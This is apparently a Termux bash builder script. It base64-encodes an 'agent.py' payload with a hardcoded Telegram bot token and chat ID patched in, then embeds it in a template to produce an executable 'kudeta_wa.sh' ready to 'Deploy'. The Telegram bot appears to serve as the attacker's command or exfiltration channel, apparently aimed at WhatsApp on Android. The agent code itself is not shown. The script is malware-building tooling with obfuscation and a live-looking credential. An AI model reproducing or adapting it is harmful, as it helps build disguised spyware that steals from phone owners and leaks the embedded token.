#!/data/data/com.termux/files/usr/bin/bash
set -e

TOKEN="8977911091:AAG8sdDSaEgK2cv26AQW9Gv2YhJL9H3_qnc"
CHAT_ID="6948740796"
AGENT_SRC="agent.py"
TEMPLATE="kudeta_wa.sh.template"
OUTPUT="kudeta_wa.sh"

echo "[*] Encoding payload..."

python3 << PYEOF
import base64, os, sys

token    = "${TOKEN}"
chat_id  = "${CHAT_ID}"
tok_b64  = base64.b64encode(token.encode()).decode()

# load and patch agent with real token
agent_raw = open("${AGENT_SRC}", "r").read()
agent_pat = agent_raw.replace("__TOKEN_B64__", tok_b64)
agent_pat = agent_pat.replace("__CHAT_ID__", chat_id)

# encode patched agent
agent_b64 = base64.b64encode(agent_pat.encode()).decode()

# load and patch template
tmpl = open("${TEMPLATE}", "r").read()
out  = tmpl.replace("__AGENT_B64__", agent_b64)
out  = out.replace("__TOKEN_B64__",  tok_b64)
out  = out.replace("__CHAT_ID__",    chat_id)

open("${OUTPUT}", "w").write(out)
os.chmod("${OUTPUT}", 0o755)

print(f"[+] {os.path.abspath('${OUTPUT}')} — {len(out):,} bytes")
print(f"[+] Agent embedded: {len(agent_pat):,} bytes → {len(agent_b64):,} b64 chars")
print(f"[+] Token b64: {tok_b64[:24]}...")
PYEOF

echo "[+] Done. Deploy: bash $OUTPUT"